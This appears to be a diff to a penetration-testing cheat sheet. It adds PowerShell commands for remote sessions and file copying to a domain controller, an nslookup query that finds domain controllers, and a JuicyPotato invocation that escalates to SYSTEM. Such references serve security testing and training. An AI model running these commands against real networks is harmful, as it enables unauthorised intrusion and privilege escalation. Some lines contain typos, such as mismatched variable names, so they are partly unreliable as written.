@@ -760,6 +760,13 @@ psexec.py whiterose.local/ealderson:Password!@192.168.92.129
 
 * https://github.com/Hackplayers/evil-winrm
 
+* PowerShell
+```
+$dcsess = New-PSSession -Computer DCHOSTNAME
+Invoke-Command -Session $dcsess -ScripBlock {ipconfig}
+Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
+```
+
 
 ## IPv6 Attacks
 
@@ -1405,6 +1412,13 @@ wmic service get name,displayname,pathname,startmode | findstr /i "auto" | finds
 # get permissions on directory
 icalcs "C:\Path"
 ```
+Discover domain controller hostname
+```
+nslookup
+set type=all
+_ldap._tcp.dc._msdcs.sandbox.local
+exit
+```
 
 
 ## User Enumeration
@@ -1533,8 +1547,13 @@ pip install xlrd==1.2.0
 ## [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
 
 ## Potato Attacks
+Check if SeImpersonatePrivilege authentication is enabled with ``whoami /priv``
 * [Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
 * [Juicy Potato](https://github.com/ohpe/juicy-potato)
+```
+C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Public\exe.exe -l 5837
+```
+
 
 
 # Linux Privilege Escalation
